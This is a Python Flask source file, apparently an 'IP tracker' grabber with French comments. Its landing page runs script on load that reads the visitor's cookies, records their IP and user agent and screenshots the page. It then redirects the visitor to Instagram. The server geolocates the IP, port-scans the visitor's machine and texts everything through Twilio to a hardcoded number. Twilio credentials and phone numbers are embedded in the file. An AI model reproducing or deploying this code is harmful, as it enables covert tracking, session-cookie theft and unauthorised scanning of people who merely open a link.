from flask import Flask, request, jsonify, redirect
from twilio.rest import Client
import requests
import socket

app = Flask(__name__)

# Twilio credentials
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = 'ab95f4ee6a016c23b123670550a6cde7'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return f"{res['city']}, {res['regionName']}, {res['country']} (ISP: {res['isp']})"
    except:
        return "Localisation impossible"

def scan_ports(ip):
    try:
        common_ports = [21, 22, 23, 80, 443, 445]
        open_ports = []
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        return open_ports
    except:
        return []

def send_sms(ip, user_agent, cookies, screenshot):
    location = get_geolocation(ip)
    ports = scan_ports(ip)
    
    message_body = (
        f"[IP TRACKER]\n"
        f"IP : {ip}\n"
        f"User-Agent : {user_agent}\n"
        f"Cookies : {cookies[:50]}...\n"
        f"Screenshot : {screenshot[:50]}...\n"
        f"Localisation : {location}\n"
        f"Ports ouverts : {ports if ports else 'Aucun'}"
    )

    print("[DEBUG] Envoi SMS...")
    print(message_body)

    try:
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print(f"[DEBUG] SMS envoyé ! SID : {message.sid}")
    except Exception as e:
        print(f"[ERREUR TWILIO] {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
        <script>
            const cookies = document.cookie;

            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL();

                    // Envoie immédiat (pas besoin de clic)
                    fetch("/log", {
                        method: "POST",
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ip: data.ip,
                            ua: navigator.userAgent,
                            cookies: cookies,
                            screenshot: screenshot
                        })
                    }).then(() => {
                        // Redirection après envoi
                        window.location.href = "https://instagram.com";
                    });
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    cookies = data.get('cookies')
    screenshot = data.get('screenshot')

    print(f"[DEBUG] Données reçues : IP={ip}, UA={user_agent}")
    send_sms(ip, user_agent, cookies, screenshot)

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
